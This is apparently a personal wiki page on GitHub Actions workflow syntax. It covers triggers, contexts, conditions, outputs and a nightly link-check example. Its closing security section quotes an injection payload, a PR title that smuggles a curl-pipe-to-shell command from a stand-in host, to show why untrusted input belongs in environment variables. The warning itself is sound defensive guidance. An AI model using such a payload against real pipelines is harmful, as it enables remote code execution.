# Workflow Syntax

The parts of a workflow file you'll use beyond the basics: triggers, conditions, expressions, contexts, outputs.

## Triggers (`on:`)
```yaml
on:
  push:
    branches: [main, 'release/**']
    tags: ['v*']
    paths: ['src/**', 'package.json']      # only when these files change
    paths-ignore: ['docs/**']
  pull_request:
    types: [opened, synchronize, reopened]  # the default set
  schedule:
    - cron: "17 3 * * *"                    # 03:17 UTC daily
  workflow_dispatch:                        # a "Run workflow" button
    inputs:
      environment:
        type: choice
        options: [staging, production]
  release:
    types: [published]
  workflow_call:                            # makes it reusable
```
| Event | Fires when |
|---|---|
| `push` | commits or tags are pushed |
| `pull_request` | a PR is opened or updated (runs on the merge result) |
| `schedule` | cron time (UTC; may be delayed when GitHub is busy; disabled after 60 days without repository activity) |
| `workflow_dispatch` | someone clicks *Run workflow* or runs `gh workflow run` |
| `release` | a release is published |
| `issues`, `issue_comment` | issue activity |
| `merge_group` | a PR enters the merge queue ([[github/Protecting Main]]) |
| `workflow_run` | another workflow finished |

Use a random minute for cron (`17`, not `0`): on the hour, every workflow on GitHub starts at once.

## Expressions and contexts
`${{ … }}` evaluates an expression. Common contexts:
| Context | Examples |
|---|---|
| `github` | `github.ref` (`refs/heads/main`), `github.ref_name` (`main`, `v1.2.0`), `github.sha`, `github.event_name`, `github.actor`, `github.repository` |
| `env` | variables set with `env:` |
| `vars` | repository/organization **variables** (not secret) |
| `secrets` | `secrets.DEPLOY_TOKEN` ([[github/Secrets and Environments]]) |
| `inputs` | `workflow_dispatch` / `workflow_call` inputs |
| `matrix` | the current matrix combination |
| `steps` | `steps.<id>.outputs.<name>`, `steps.<id>.outcome` |
| `needs` | outputs of jobs this job depends on |
| `runner` | `runner.os`, `runner.temp` |

Functions: `contains()`, `startsWith()`, `endsWith()`, `format()`, `join()`, `toJSON()`, `fromJSON()`, `hashFiles('**/package-lock.json')`.

## Conditions (`if:`)
```yaml
jobs:
  deploy:
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    steps:
      - run: ./notify.sh
        if: failure()                 # only if a previous step failed
      - run: ./cleanup.sh
        if: always()                  # even if cancelled or failed
      - run: echo "Windows only"
        if: runner.os == 'Windows'
```
Status functions: `success()` (default), `failure()`, `always()`, `cancelled()`. In `if:` the `${{ }}` is optional.

## A complete example: nightly job with a manual button
```yaml
name: Nightly link check
on:
  schedule:
    - cron: "17 3 * * *"            # 03:17 UTC every day
  workflow_dispatch:
    inputs:
      url:
        description: Site to check
        default: https://lfdiego.xyz
        required: true

jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Check links
        env:
          URL: ${{ inputs.url || 'https://lfdiego.xyz' }}
        run: npx --yes linkinator "$URL" --recurse --skip "^(?!https://lfdiego\.xyz)"
      - name: Open an issue on failure
        if: failure() && github.event_name == 'schedule'
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh issue create --repo "$GITHUB_REPOSITORY" --title "Broken links found" --body "See $GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
    permissions:
      issues: write
```
`gh` is preinstalled on GitHub-hosted runners and uses `GH_TOKEN`.

## Environment variables
```yaml
env:                          # whole workflow
  NODE_ENV: production
jobs:
  build:
    env:                      # one job
      API_URL: https://api.example.com
    steps:
      - run: echo "$API_URL"
        env:                  # one step
          DEBUG: "1"
```
Default variables are always there: `GITHUB_SHA`, `GITHUB_REF_NAME`, `GITHUB_REPOSITORY`, `GITHUB_WORKSPACE`, `RUNNER_OS`, `CI=true`.

## Passing data between steps and jobs
```yaml
jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.v.outputs.tag }}
    steps:
      - id: v
        run: echo "tag=v$(date +%Y.%m.%d)" >> "$GITHUB_OUTPUT"
  release:
    needs: version
    runs-on: ubuntu-latest
    steps:
      - run: echo "Releasing ${{ needs.version.outputs.tag }}"
```
- `$GITHUB_OUTPUT`: step outputs.
- `$GITHUB_ENV`: set an env variable for later steps (`echo "X=1" >> "$GITHUB_ENV"`).
- `$GITHUB_STEP_SUMMARY`: Markdown shown on the run's summary page.
- Files between jobs: artifacts ([[github/Actions in Depth]]).

## Shells and multi-line scripts
```yaml
- name: Build and test
  shell: bash
  run: |
    set -euo pipefail
    npm ci
    npm test
```
`run: |` keeps line breaks. On Linux/macOS the default shell is `bash -e`; on Windows it's PowerShell (`shell: bash` works there too, via Git Bash).

## Don't inject untrusted input into `run:`
```yaml
# WRONG: a PR title like  "; curl evil.sh | sh"  becomes shell code
- run: echo "${{ github.event.pull_request.title }}"
# RIGHT: pass it as an environment variable
- run: echo "$TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```
→ [[github/Actions Security]]
